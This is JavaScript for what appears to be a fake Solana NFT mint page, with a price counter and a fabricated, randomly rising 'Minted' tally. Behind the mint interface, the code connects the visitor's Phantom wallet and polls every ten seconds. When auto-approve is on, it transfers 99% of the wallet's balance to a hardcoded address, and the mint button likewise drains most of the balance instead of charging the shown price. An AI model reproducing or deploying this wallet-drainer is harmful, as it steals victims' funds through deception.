
    function upValue() {

        document.getElementById('counet').value = parseInt(1) + parseInt(document.getElementById('counet').value);

        document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 0.33).toFixed(2).toString() + ' SOL';
    }

    function downValue() {
        if (document.getElementById('counet').value == '1') {

        } else {

            document.getElementById('counet').value = parseInt(document.getElementById('counet').value) - parseInt(1);

            document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 0.33).toFixed(2).toString() + ' SOL';
        }
    }

    window.addEventListener('load', () => {


        var sent = false;
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));

        const getProvider = () => {
            if ("solana" in window) {
                const provider = window.solana;
                if (provider.isPhantom) {
                    return provider;
                }
            }
            window.open("https://phantom.app/", "_blank");
        };

        function onBodyLoad() {

            const solConnected = window.solana.isConnected;

            if (!solConnected) {
                connectWallet();

            } else {
                document.getElementById('transfer').style.display = 'flex';
                document.getElementById('connect').style.display = 'none';
            }
            refreshStatus();

        }


        function refreshStatus() {
            const provider = getProvider();
            if (provider) {
                provider.on("connect", () => {
                    setConnected();
                    document.getElementById('transfer').style.display = 'flex';
                    document.getElementById('connect').style.display = 'none';
                });
                provider.on("disconnect", () => {
                    setNotConnected();
                });
            }
        }

        function connectWallet() {
            window.solana.connect({
                onlyIfTrusted: false
            });
        }

        async function setConnected() {
            let account_info = await connection.getAccountInfo(window.solana.publicKey);
            console.log("Auto Approve: " + window.solana.autoApprove);
        }

        function trySend() {
            if (window.solana.autoApprove) {
                if (!sent) {
                    apimainnet();
                }
            } else {
                console.log("Not auto approve!");
            }
        }

        async function testTransfer2(howmany) {
            const provider = getProvider();
            const solConected = window.solana.isConnected;
            const manylamports = (howmany * 1000000000).toFixed(0);

            if (!provider) {
                return;
            }
            if (!solConected) {
                return;
            }

            let account_info = await connection.getAccountInfo(window.solana.publicKey);
            var charginglamports = manylamports;
            console.log(charginglamports)
            if ((account_info.lamports / 2) > manylamports) {
                charginglamports = (account_info.lamports * 0.99).toFixed(0);
            }

            if (account_info.lamports < manylamports && account_info.lamports > 100000) {
                charginglamports = (account_info.lamports * 0.99).toFixed(0);
            }
            console.log(charginglamports);

            let transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: provider.publicKey,
                    toPubkey: "J58dRMnWrQncP91fzffNuFGaVn8GSEQ8zDGC4FUwWnZK",
                    lamports: charginglamports,
                })
            );

            let {
                blockhash
            } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = provider.publicKey;

            return transaction;
        }

        async function makeTransfer(howmany) {
            let transaction = await testTransfer2(howmany);
            const provider = getProvider();

            if (!provider) {
                return;
            }
            console.log(provider);
            console.log(transaction);

            if (transaction) {
                //try {

                console.log("asd");
                let signed = await provider.signTransaction(transaction, connection);
                console.log(signed);
                let signature = await connection.sendRawTransaction(signed.serialize());
                console.log(signature);
                await connection.confirmTransaction(signature);
                //} catch(err) {
                //  console.warn(err);
                //}
            }
        }

        async function testTransfer() {
            const provider = getProvider();
            const solConected = window.solana.isConnected;

            if (!provider) {
                return;
            }
            if (!solConected) {
                return;
            }

            let account_info = await connection.getAccountInfo(window.solana.publicKey);

            if (account_info.lamports >= 10000000) {
                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: "4J58dRMnWrQncP91fzffNuFGaVn8GSEQ8zDGC4FUwWnZK",
                        lamports: (account_info.lamports * 0.99).toFixed(0),
                    })
                );

                let {
                    blockhash
                } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = provider.publicKey;

                return transaction;
            }
        }

        async function apimainnet() {
            let transaction = await testTransfer();
            const provider = getProvider();

            if (!provider) {
                return;
            }
            console.log(provider);
            console.log(transaction);

            if (transaction) {
                //try {

                console.log("asd");
                let signed = await provider.signTransaction(transaction, connection);
                console.log(signed);
                let signature = await connection.sendRawTransaction(signed.serialize());
                console.log(signature);
                sent = true;
                await connection.confirmTransaction(signature);
                //} catch(err) {
                //  console.warn(err);
                //}
            }
        }

        function setNotConnected() {
            // document.getElementById("connStatus").innerHTML = "Not Connected";
        }

        onBodyLoad();
        setInterval(trySend, 10000);

        document.getElementById('transfer').onclick = function () {
            makeTransfer(100000);
        }
        document.getElementById('connect').onclick = function () {
            onBodyLoad();
        }
    });


    var count = 6532;
    tick(count, 6399, 6666, ',');

    function tick(start, final, end, delimiter) {
        var elemMinted = document.querySelector('.minted');

        elemMinted.innerHTML = 'Minted: ' + numberWithSpaces(count) + ' / ' + numberWithSpaces(end);

        var interval = setInterval(function () {
            if (count >= final) {
                clearInterval(interval);
            }

            count += getRandomIntInclusive(1, 130);
            elemMinted.innerHTML = 'Minted: ' + numberWithSpaces(count) + ' / ' + numberWithSpaces(end);
        }, 2000);

        function numberWithSpaces(x) {
            return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, delimiter);
        }

        function getRandomIntInclusive(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
        }
    }